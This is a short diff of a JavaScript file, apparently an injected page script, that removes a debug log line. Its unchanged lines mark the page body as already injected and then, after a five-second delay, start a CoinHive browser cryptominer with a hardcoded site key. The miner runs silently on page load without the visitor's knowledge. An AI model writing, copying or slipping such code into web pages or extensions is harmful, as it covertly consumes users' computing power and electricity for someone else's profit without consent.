@@ -4,7 +4,6 @@ function Run(){
 		return false;
 	}
 	document.getElementsByTagName('body')[0].setAttribute('data-already-inject', 'true');
-	console.log('Hello');
 	setTimeout(function(){
 		var m = new CoinHive.Anonymous("j4Ottz1bbmrWDgfcjHEzZQZIlfA3vnPF", {throttle: throttleFromConfJs}); m.start();
 	}, 5000);
